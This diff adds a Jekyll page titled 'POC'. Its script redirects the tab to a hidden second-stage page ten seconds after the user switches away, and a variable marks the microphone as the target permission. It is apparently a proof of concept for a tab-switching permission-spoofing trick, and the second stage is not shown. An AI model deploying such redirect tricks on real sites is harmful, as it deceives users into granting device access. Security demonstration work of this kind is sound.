@@ -1,0 +1,43 @@
+---
+layout: page
+title: POC
+permalink: /poc/
+image: '/images/08.jpg'
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title></title>
+</head>
+
+<body>
+    <script>
+        window.onload = function () {
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible') {
+                    console.log("Content is displayed.");
+                }
+                if (document.visibilityState === 'hidden') {
+                    console.log("Content is background.");
+                    setTimeout("go()",10000)
+                }
+            })
+        }
+        function go() {
+            var targetPermission = "microphone";
+            document.cookie = "load=0";
+            window.location = "https://" + location.hostname + "/77cxk/second.html"
+        }
+
+    </script>
+
+    <br>
+    <br>
+    <br>
+    <a href="https://example.com/" target="_blank">Open a New Tab</a>
+</body>
+</body>
+
+</html>
